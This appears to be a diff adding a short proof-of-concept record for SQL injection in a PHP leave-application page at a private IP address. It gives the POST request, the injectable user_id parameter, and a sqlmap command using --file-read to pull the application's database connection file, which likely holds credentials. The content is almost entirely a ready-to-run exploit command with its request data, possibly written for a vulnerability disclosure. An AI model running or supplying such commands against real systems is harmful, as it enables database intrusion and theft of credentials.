@@ -1,0 +1,3 @@
+http://192.168.0.18:80/doon23/dept/app_leave_off.php (POST)  # sqlmap.py -r leave-off-request.txt -p user_id --batch --file-read=/opt/lampp/htdocs/doon23/db_con.php\ --output-dir=D:\git-project\tools\sqlmap\results
+
+user_id=8979873475&submit=submit
